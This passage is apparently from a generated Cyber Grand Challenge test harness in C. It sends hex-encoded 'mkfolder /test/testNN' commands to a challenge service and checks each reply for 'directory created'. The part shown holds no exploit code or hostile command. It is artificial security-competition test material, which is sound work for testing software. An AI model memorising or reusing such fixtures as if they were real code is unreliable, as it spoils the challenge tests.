         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x34\x32\x0a";
      static unsigned int write_00044_00000_len = 22;
      unsigned char *write_00044 = NULL;
      unsigned int write_00044_len = 0;
      write_00044 = cgc_append_buf(write_00044, &write_00044_len, write_00044_00000, write_00044_00000_len);
      if (write_00044_len > 0) {
         cgc_transmit_all(1, write_00044, write_00044_len);
      }
      cgc_free(write_00044);
   } while (0);
   do {
      unsigned char *read_00046;
      unsigned int read_00046_len;
      unsigned int read_00046_ptr = 0;
      //**** delimited read
      static unsigned char read_00046_delim[] = 
         "\x25\x20";
      read_00046 = NULL;
      read_00046_len = 0;
      int read_00046_res = cgc_delimited_read(0, &read_00046, &read_00046_len, read_00046_delim, 2);
      if (read_00046_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00046_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00046_ptr += cgc_data_match(read_00046 + read_00046_ptr, read_00046_len - read_00046_ptr, match_00046_00000, 18);
      cgc_free(read_00046);
      if (read_00046_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00045_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x34\x33\x0a";
      static unsigned int write_00045_00000_len = 22;
      unsigned char *write_00045 = NULL;
      unsigned int write_00045_len = 0;
      write_00045 = cgc_append_buf(write_00045, &write_00045_len, write_00045_00000, write_00045_00000_len);
      if (write_00045_len > 0) {
         cgc_transmit_all(1, write_00045, write_00045_len);
      }
      cgc_free(write_00045);
   } while (0);
   do {
      unsigned char *read_00047;
      unsigned int read_00047_len;
      unsigned int read_00047_ptr = 0;
      //**** delimited read
      static unsigned char read_00047_delim[] = 
         "\x25\x20";
      read_00047 = NULL;
      read_00047_len = 0;
      int read_00047_res = cgc_delimited_read(0, &read_00047, &read_00047_len, read_00047_delim, 2);
      if (read_00047_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00047_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00047_ptr += cgc_data_match(read_00047 + read_00047_ptr, read_00047_len - read_00047_ptr, match_00047_00000, 18);
      cgc_free(read_00047);
      if (read_00047_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00046_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x34\x34\x0a";
      static unsigned int write_00046_00000_len = 22;
      unsigned char *write_00046 = NULL;
      unsigned int write_00046_len = 0;
      write_00046 = cgc_append_buf(write_00046, &write_00046_len, write_00046_00000, write_00046_00000_len);
      if (write_00046_len > 0) {
         cgc_transmit_all(1, write_00046, write_00046_len);
      }
      cgc_free(write_00046);
   } while (0);
   do {
      unsigned char *read_00048;
      unsigned int read_00048_len;
      unsigned int read_00048_ptr = 0;
      //**** delimited read
      static unsigned char read_00048_delim[] = 
         "\x25\x20";
      read_00048 = NULL;
      read_00048_len = 0;
      int read_00048_res = cgc_delimited_read(0, &read_00048, &read_00048_len, read_00048_delim, 2);
      if (read_00048_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00048_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00048_ptr += cgc_data_match(read_00048 + read_00048_ptr, read_00048_len - read_00048_ptr, match_00048_00000, 18);
      cgc_free(read_00048);
      if (read_00048_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00047_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x34\x35\x0a";
      static unsigned int write_00047_00000_len = 22;
      unsigned char *write_00047 = NULL;
      unsigned int write_00047_len = 0;
      write_00047 = cgc_append_buf(write_00047, &write_00047_len, write_00047_00000, write_00047_00000_len);
      if (write_00047_len > 0) {
         cgc_transmit_all(1, write_00047, write_00047_len);
      }
      cgc_free(write_00047);
   } while (0);
   do {
      unsigned char *read_00049;
      unsigned int read_00049_len;
      unsigned int read_00049_ptr = 0;
      //**** delimited read
      static unsigned char read_00049_delim[] = 
         "\x25\x20";
      read_00049 = NULL;
      read_00049_len = 0;
      int read_00049_res = cgc_delimited_read(0, &read_00049, &read_00049_len, read_00049_delim, 2);
      if (read_00049_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00049_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00049_ptr += cgc_data_match(read_00049 + read_00049_ptr, read_00049_len - read_00049_ptr, match_00049_00000, 18);
      cgc_free(read_00049);
      if (read_00049_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00048_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x34\x36\x0a";
      static unsigned int write_00048_00000_len = 22;
      unsigned char *write_00048 = NULL;
      unsigned int write_00048_len = 0;
      write_00048 = cgc_append_buf(write_00048, &write_00048_len, write_00048_00000, write_00048_00000_len);
      if (write_00048_len > 0) {
         cgc_transmit_all(1, write_00048, write_00048_len);
      }
      cgc_free(write_00048);
   } while (0);
   do {
      unsigned char *read_00050;
      unsigned int read_00050_len;
      unsigned int read_00050_ptr = 0;
      //**** delimited read
      static unsigned char read_00050_delim[] = 
         "\x25\x20";
      read_00050 = NULL;
      read_00050_len = 0;
      int read_00050_res = cgc_delimited_read(0, &read_00050, &read_00050_len, read_00050_delim, 2);
      if (read_00050_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00050_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00050_ptr += cgc_data_match(read_00050 + read_00050_ptr, read_00050_len - read_00050_ptr, match_00050_00000, 18);
      cgc_free(read_00050);
      if (read_00050_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00049_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x34\x37\x0a";
      static unsigned int write_00049_00000_len = 22;
      unsigned char *write_00049 = NULL;
      unsigned int write_00049_len = 0;
      write_00049 = cgc_append_buf(write_00049, &write_00049_len, write_00049_00000, write_00049_00000_len);
      if (write_00049_len > 0) {
         cgc_transmit_all(1, write_00049, write_00049_len);
      }
      cgc_free(write_00049);
   } while (0);
   do {
      unsigned char *read_00051;
      unsigned int read_00051_len;
      unsigned int read_00051_ptr = 0;
      //**** delimited read
      static unsigned char read_00051_delim[] = 
         "\x25\x20";
      read_00051 = NULL;
      read_00051_len = 0;
      int read_00051_res = cgc_delimited_read(0, &read_00051, &read_00051_len, read_00051_delim, 2);
      if (read_00051_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00051_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00051_ptr += cgc_data_match(read_00051 + read_00051_ptr, read_00051_len - read_00051_ptr, match_00051_00000, 18);
      cgc_free(read_00051);
      if (read_00051_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00050_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x34\x38\x0a";
      static unsigned int write_00050_00000_len = 22;
      unsigned char *write_00050 = NULL;
      unsigned int write_00050_len = 0;
      write_00050 = cgc_append_buf(write_00050, &write_00050_len, write_00050_00000, write_00050_00000_len);
      if (write_00050_len > 0) {
         cgc_transmit_all(1, write_00050, write_00050_len);
      }
      cgc_free(write_00050);
   } while (0);
   do {
      unsigned char *read_00052;
      unsigned int read_00052_len;
      unsigned int read_00052_ptr = 0;
      //**** delimited read
      static unsigned char read_00052_delim[] = 
         "\x25\x20";
      read_00052 = NULL;
      read_00052_len = 0;
      int read_00052_res = cgc_delimited_read(0, &read_00052, &read_00052_len, read_00052_delim, 2);
      if (read_00052_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00052_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00052_ptr += cgc_data_match(read_00052 + read_00052_ptr, read_00052_len - read_00052_ptr, match_00052_00000, 18);
      cgc_free(read_00052);
      if (read_00052_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00051_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x34\x39\x0a";
      static unsigned int write_00051_00000_len = 22;
      unsigned char *write_00051 = NULL;
      unsigned int write_00051_len = 0;
      write_00051 = cgc_append_buf(write_00051, &write_00051_len, write_00051_00000, write_00051_00000_len);
      if (write_00051_len > 0) {
         cgc_transmit_all(1, write_00051, write_00051_len);
      }
      cgc_free(write_00051);
   } while (0);
   do {
      unsigned char *read_00053;
      unsigned int read_00053_len;
      unsigned int read_00053_ptr = 0;
      //**** delimited read
      static unsigned char read_00053_delim[] = 
         "\x25\x20";
      read_00053 = NULL;
      read_00053_len = 0;
      int read_00053_res = cgc_delimited_read(0, &read_00053, &read_00053_len, read_00053_delim, 2);
      if (read_00053_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00053_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00053_ptr += cgc_data_match(read_00053 + read_00053_ptr, read_00053_len - read_00053_ptr, match_00053_00000, 18);
      cgc_free(read_00053);
      if (read_00053_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00052_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x35\x30\x0a";
      static unsigned int write_00052_00000_len = 22;
      unsigned char *write_00052 = NULL;
      unsigned int write_00052_len = 0;
      write_00052 = cgc_append_buf(write_00052, &write_00052_len, write_00052_00000, write_00052_00000_len);
      if (write_00052_len > 0) {
         cgc_transmit_all(1, write_00052, write_00052_len);
      }
      cgc_free(write_00052);
   } while (0);
   do {
      unsigned char *read_00054;
      unsigned int read_00054_len;
      unsigned int read_00054_ptr = 0;
      //**** delimited read
      static unsigned char read_00054_delim[] = 
         "\x25\x20";
      read_00054 = NULL;
      read_00054_len = 0;
      int read_00054_res = cgc_delimited_read(0, &read_00054, &read_00054_len, read_00054_delim, 2);
      if (read_00054_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00054_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00054_ptr += cgc_data_match(read_00054 + read_00054_ptr, read_00054_len - read_00054_ptr, match_00054_00000, 18);
      cgc_free(read_00054);
      if (read_00054_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00053_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x35\x31\x0a";
      static unsigned int write_00053_00000_len = 22;
      unsigned char *write_00053 = NULL;
      unsigned int write_00053_len = 0;
      write_00053 = cgc_append_buf(write_00053, &write_00053_len, write_00053_00000, write_00053_00000_len);
      if (write_00053_len > 0) {
         cgc_transmit_all(1, write_00053, write_00053_len);
      }
      cgc_free(write_00053);
   } while (0);
   do {
      unsigned char *read_00055;
      unsigned int read_00055_len;
      unsigned int read_00055_ptr = 0;
      //**** delimited read
      static unsigned char read_00055_delim[] = 
         "\x25\x20";
      read_00055 = NULL;
      read_00055_len = 0;
      int read_00055_res = cgc_delimited_read(0, &read_00055, &read_00055_len, read_00055_delim, 2);
      if (read_00055_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00055_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00055_ptr += cgc_data_match(read_00055 + read_00055_ptr, read_00055_len - read_00055_ptr, match_00055_00000, 18);
      cgc_free(read_00055);
      if (read_00055_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00054_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x35\x32\x0a";
      static unsigned int write_00054_00000_len = 22;
      unsigned char *write_00054 = NULL;
      unsigned int write_00054_len = 0;
      write_00054 = cgc_append_buf(write_00054, &write_00054_len, write_00054_00000, write_00054_00000_len);
      if (write_00054_len > 0) {
         cgc_transmit_all(1, write_00054, write_00054_len);
      }
      cgc_free(write_00054);
   } while (0);
   do {
      unsigned char *read_00056;
      unsigned int read_00056_len;
      unsigned int read_00056_ptr = 0;
      //**** delimited read
      static unsigned char read_00056_delim[] = 
         "\x25\x20";
      read_00056 = NULL;
      read_00056_len = 0;
      int read_00056_res = cgc_delimited_read(0, &read_00056, &read_00056_len, read_00056_delim, 2);
      if (read_00056_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00056_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00056_ptr += cgc_data_match(read_00056 + read_00056_ptr, read_00056_len - read_00056_ptr, match_00056_00000, 18);
      cgc_free(read_00056);
      if (read_00056_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00055_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x35\x33\x0a";
      static unsigned int write_00055_00000_len = 22;
      unsigned char *write_00055 = NULL;
      unsigned int write_00055_len = 0;
      write_00055 = cgc_append_buf(write_00055, &write_00055_len, write_00055_00000, write_00055_00000_len);
      if (write_00055_len > 0) {
         cgc_transmit_all(1, write_00055, write_00055_len);
      }
      cgc_free(write_00055);
   } while (0);
   do {
      unsigned char *read_00057;
      unsigned int read_00057_len;
      unsigned int read_00057_ptr = 0;
      //**** delimited read
      static unsigned char read_00057_delim[] = 
         "\x25\x20";
      read_00057 = NULL;
      read_00057_len = 0;
      int read_00057_res = cgc_delimited_read(0, &read_00057, &read_00057_len, read_00057_delim, 2);
      if (read_00057_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00057_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00057_ptr += cgc_data_match(read_00057 + read_00057_ptr, read_00057_len - read_00057_ptr, match_00057_00000, 18);
      cgc_free(read_00057);
      if (read_00057_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00056_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x35\x34\x0a";
      static unsigned int write_00056_00000_len = 22;
      unsigned char *write_00056 = NULL;
      unsigned int write_00056_len = 0;
      write_00056 = cgc_append_buf(write_00056, &write_00056_len, write_00056_00000, write_00056_00000_len);
      if (write_00056_len > 0) {
         cgc_transmit_all(1, write_00056, write_00056_len);
      }
      cgc_free(write_00056);
   } while (0);
   do {
      unsigned char *read_00058;
      unsigned int read_00058_len;
      unsigned int read_00058_ptr = 0;
      //**** delimited read
      static unsigned char read_00058_delim[] = 
         "\x25\x20";
      read_00058 = NULL;
      read_00058_len = 0;
      int read_00058_res = cgc_delimited_read(0, &read_00058, &read_00058_len, read_00058_delim, 2);
      if (read_00058_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00058_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00058_ptr += cgc_data_match(read_00058 + read_00058_ptr, read_00058_len - read_00058_ptr, match_00058_00000, 18);
      cgc_free(read_00058);
      if (read_00058_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00057_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x35\x35\x0a";
      static unsigned int write_00057_00000_len = 22;
      unsigned char *write_00057 = NULL;
      unsigned int write_00057_len = 0;
      write_00057 = cgc_append_buf(write_00057, &write_00057_len, write_00057_00000, write_00057_00000_len);
      if (write_00057_len > 0) {
         cgc_transmit_all(1, write_00057, write_00057_len);
      }
      cgc_free(write_00057);
   } while (0);
   do {
      unsigned char *read_00059;
      unsigned int read_00059_len;
      unsigned int read_00059_ptr = 0;
      //**** delimited read
      static unsigned char read_00059_delim[] = 
         "\x25\x20";
      read_00059 = NULL;
      read_00059_len = 0;
      int read_00059_res = cgc_delimited_read(0, &read_00059, &read_00059_len, read_00059_delim, 2);
      if (read_00059_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00059_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00059_ptr += cgc_data_match(read_00059 + read_00059_ptr, read_00059_len - read_00059_ptr, match_00059_00000, 18);
      cgc_free(read_00059);
      if (read_00059_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00058_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x35\x36\x0a";
      static unsigned int write_00058_00000_len = 22;
      unsigned char *write_00058 = NULL;
      unsigned int write_00058_len = 0;
      write_00058 = cgc_append_buf(write_00058, &write_00058_len, write_00058_00000, write_00058_00000_len);
      if (write_00058_len > 0) {
         cgc_transmit_all(1, write_00058, write_00058_len);
      }
      cgc_free(write_00058);
   } while (0);
   do {
      unsigned char *read_00060;
      unsigned int read_00060_len;
      unsigned int read_00060_ptr = 0;
      //**** delimited read
      static unsigned char read_00060_delim[] = 
         "\x25\x20";
      read_00060 = NULL;
      read_00060_len = 0;
      int read_00060_res = cgc_delimited_read(0, &read_00060, &read_00060_len, read_00060_delim, 2);
      if (read_00060_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00060_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00060_ptr += cgc_data_match(read_00060 + read_00060_ptr, read_00060_len - read_00060_ptr, match_00060_00000, 18);
      cgc_free(read_00060);
      if (read_00060_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00059_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x35\x37\x0a";
      static unsigned int write_00059_00000_len = 22;
      unsigned char *write_00059 = NULL;
      unsigned int write_00059_len = 0;
      write_00059 = cgc_append_buf(write_00059, &write_00059_len, write_00059_00000, write_00059_00000_len);
      if (write_00059_len > 0) {
         cgc_transmit_all(1, write_00059, write_00059_len);
      }
      cgc_free(write_00059);
   } while (0);
   do {
      unsigned char *read_00061;
      unsigned int read_00061_len;
      unsigned int read_00061_ptr = 0;
      //**** delimited read
      static unsigned char read_00061_delim[] = 
         "\x25\x20";
      read_00061 = NULL;
      read_00061_len = 0;
      int read_00061_res = cgc_delimited_read(0, &read_00061, &read_00061_len, read_00061_delim, 2);
      if (read_00061_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00061_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00061_ptr += cgc_data_match(read_00061 + read_00061_ptr, read_00061_len - read_00061_ptr, match_00061_00000, 18);
      cgc_free(read_00061);
      if (read_00061_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00060_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x35\x38\x0a";
      static unsigned int write_00060_00000_len = 22;
      unsigned char *write_00060 = NULL;
      unsigned int write_00060_len = 0;
      write_00060 = cgc_append_buf(write_00060, &write_00060_len, write_00060_00000, write_00060_00000_len);
      if (write_00060_len > 0) {
         cgc_transmit_all(1, write_00060, write_00060_len);
      }
      cgc_free(write_00060);
   } while (0);
   do {
      unsigned char *read_00062;
      unsigned int read_00062_len;
      unsigned int read_00062_ptr = 0;
      //**** delimited read
      static unsigned char read_00062_delim[] = 
         "\x25\x20";
      read_00062 = NULL;
      read_00062_len = 0;
      int read_00062_res = cgc_delimited_read(0, &read_00062, &read_00062_len, read_00062_delim, 2);
      if (read_00062_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00062_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00062_ptr += cgc_data_match(read_00062 + read_00062_ptr, read_00062_len - read_00062_ptr, match_00062_00000, 18);
      cgc_free(read_00062);
      if (read_00062_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00061_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x35\x39\x0a";
      static unsigned int write_00061_00000_len = 22;
      unsigned char *write_00061 = NULL;
      unsigned int write_00061_len = 0;
      write_00061 = cgc_append_buf(write_00061, &write_00061_len, write_00061_00000, write_00061_00000_len);
      if (write_00061_len > 0) {
         cgc_transmit_all(1, write_00061, write_00061_len);
      }
      cgc_free(write_00061);
   } while (0);
   do {
      unsigned char *read_00063;
      unsigned int read_00063_len;
      unsigned int read_00063_ptr = 0;
      //**** delimited read
      static unsigned char read_00063_delim[] = 
         "\x25\x20";
      read_00063 = NULL;
      read_00063_len = 0;
      int read_00063_res = cgc_delimited_read(0, &read_00063, &read_00063_len, read_00063_delim, 2);
      if (read_00063_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00063_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00063_ptr += cgc_data_match(read_00063 + read_00063_ptr, read_00063_len - read_00063_ptr, match_00063_00000, 18);
      cgc_free(read_00063);
      if (read_00063_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00062_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x36\x30\x0a";
      static unsigned int write_00062_00000_len = 22;
      unsigned char *write_00062 = NULL;
      unsigned int write_00062_len = 0;
      write_00062 = cgc_append_buf(write_00062, &write_00062_len, write_00062_00000, write_00062_00000_len);
      if (write_00062_len > 0) {
         cgc_transmit_all(1, write_00062, write_00062_len);
      }
      cgc_free(write_00062);
   } while (0);
   do {
      unsigned char *read_00064;
      unsigned int read_00064_len;
      unsigned int read_00064_ptr = 0;
      //**** delimited read
      static unsigned char read_00064_delim[] = 
         "\x25\x20";
      read_00064 = NULL;
      read_00064_len = 0;
      int read_00064_res = cgc_delimited_read(0, &read_00064, &read_00064_len, read_00064_delim, 2);
      if (read_00064_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00064_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00064_ptr += cgc_data_match(read_00064 + read_00064_ptr, read_00064_len - read_00064_ptr, match_00064_00000, 18);
      cgc_free(read_00064);
      if (read_00064_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00063_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x36\x31\x0a";
      static unsigned int write_00063_00000_len = 22;
      unsigned char *write_00063 = NULL;
      unsigned int write_00063_len = 0;
      write_00063 = cgc_append_buf(write_00063, &write_00063_len, write_00063_00000, write_00063_00000_len);
      if (write_00063_len > 0) {
         cgc_transmit_all(1, write_00063, write_00063_len);
      }
      cgc_free(write_00063);
   } while (0);
   do {
      unsigned char *read_00065;
      unsigned int read_00065_len;
      unsigned int read_00065_ptr = 0;
      //**** delimited read
      static unsigned char read_00065_delim[] = 
         "\x25\x20";
      read_00065 = NULL;
      read_00065_len = 0;
      int read_00065_res = cgc_delimited_read(0, &read_00065, &read_00065_len, read_00065_delim, 2);
      if (read_00065_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00065_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00065_ptr += cgc_data_match(read_00065 + read_00065_ptr, read_00065_len - read_00065_ptr, match_00065_00000, 18);
      cgc_free(read_00065);
      if (read_00065_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00064_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x36\x32\x0a";
      static unsigned int write_00064_00000_len = 22;
      unsigned char *write_00064 = NULL;
      unsigned int write_00064_len = 0;
      write_00064 = cgc_append_buf(write_00064, &write_00064_len, write_00064_00000, write_00064_00000_len);
      if (write_00064_len > 0) {
         cgc_transmit_all(1, write_00064, write_00064_len);
      }
      cgc_free(write_00064);
   } while (0);
   do {
      unsigned char *read_00066;
      unsigned int read_00066_len;
      unsigned int read_00066_ptr = 0;
      //**** delimited read
      static unsigned char read_00066_delim[] = 
         "\x25\x20";
      read_00066 = NULL;
      read_00066_len = 0;
      int read_00066_res = cgc_delimited_read(0, &read_00066, &read_00066_len, read_00066_delim, 2);
      if (read_00066_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00066_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00066_ptr += cgc_data_match(read_00066 + read_00066_ptr, read_00066_len - read_00066_ptr, match_00066_00000, 18);
      cgc_free(read_00066);
      if (read_00066_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00065_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x36\x33\x0a";
      static unsigned int write_00065_00000_len = 22;
      unsigned char *write_00065 = NULL;
      unsigned int write_00065_len = 0;
      write_00065 = cgc_append_buf(write_00065, &write_00065_len, write_00065_00000, write_00065_00000_len);
      if (write_00065_len > 0) {
         cgc_transmit_all(1, write_00065, write_00065_len);
      }
      cgc_free(write_00065);
   } while (0);
   do {
      unsigned char *read_00067;
      unsigned int read_00067_len;
      unsigned int read_00067_ptr = 0;
      //**** delimited read
      static unsigned char read_00067_delim[] = 
         "\x25\x20";
      read_00067 = NULL;
      read_00067_len = 0;
      int read_00067_res = cgc_delimited_read(0, &read_00067, &read_00067_len, read_00067_delim, 2);
      if (read_00067_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00067_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00067_ptr += cgc_data_match(read_00067 + read_00067_ptr, read_00067_len - read_00067_ptr, match_00067_00000, 18);
      cgc_free(read_00067);
      if (read_00067_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00066_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x36\x34\x0a";
      static unsigned int write_00066_00000_len = 22;
      unsigned char *write_00066 = NULL;
      unsigned int write_00066_len = 0;
      write_00066 = cgc_append_buf(write_00066, &write_00066_len, write_00066_00000, write_00066_00000_len);
      if (write_00066_len > 0) {
         cgc_transmit_all(1, write_00066, write_00066_len);
      }
      cgc_free(write_00066);
   } while (0);
   do {
      unsigned char *read_00068;
      unsigned int read_00068_len;
      unsigned int read_00068_ptr = 0;
      //**** delimited read
      static unsigned char read_00068_delim[] = 
         "\x25\x20";
      read_00068 = NULL;
      read_00068_len = 0;
      int read_00068_res = cgc_delimited_read(0, &read_00068, &read_00068_len, read_00068_delim, 2);
      if (read_00068_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00068_00000[] = 
